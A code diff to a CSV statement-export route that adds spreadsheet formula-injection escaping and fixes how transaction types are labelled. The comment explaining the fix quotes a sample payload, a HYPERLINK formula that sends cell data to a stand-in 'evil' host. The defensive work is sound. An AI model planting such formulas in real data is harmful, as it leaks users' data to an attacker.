@@ -21,7 +21,7 @@ import { z } from "zod";
 import { prisma } from "@/server/db";
 import { requireUser } from "@/server/auth";
 import { HttpError, handle, parseQuery } from "@/server/http";
-import { resolveSubjectAmounts } from "@/server/subjects";
+import { resolveSubjectAmounts, transactionLabel } from "@/server/subjects";
 
 const schema = z
 	.object({
@@ -42,9 +42,19 @@ const schema = z
 		path: ["end_date"],
 	});
 
-/** RFC 4180: wrap in quotes and escape embedded quotes when needed. */
+/**
+ * RFC 4180 quoting, plus formula-injection defence.
+ *
+ * Excel and Sheets execute any cell whose text begins with `=`, `+`, `-`, `@`,
+ * tab or CR. Group names are free-text, so a circle named
+ * `=HYPERLINK("http://evil/"&A1,"click")` was written verbatim into the Group
+ * column and ran when the user opened their own statement. Prefixing an
+ * apostrophe makes the spreadsheet treat the cell as text. RFC-4180 quoting
+ * alone does NOT prevent this — the quotes are stripped before evaluation.
+ */
 function csvField(value: string | null | undefined): string {
-	const text = value ?? "";
+	let text = value ?? "";
+	if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`;
 	if (!/[",\n]/.test(text)) return text;
 	return `"${text.replace(/"/g, '""')}"`;
 }
@@ -95,7 +105,9 @@ export async function GET(request: Request) {
 			...transactions.map((tx) =>
 				[
 					tx.createdAt.toISOString().replace("T", " ").slice(0, 19),
-					tx.type,
+					// NOT `tx.type` — that reads "payout" for both an incoming circle
+					// payout and an outgoing withdrawal.
+					transactionLabel(tx),
 					tx.group?.name ?? "",
 					tx.status,
 					amounts.get(tx.id) ?? "",
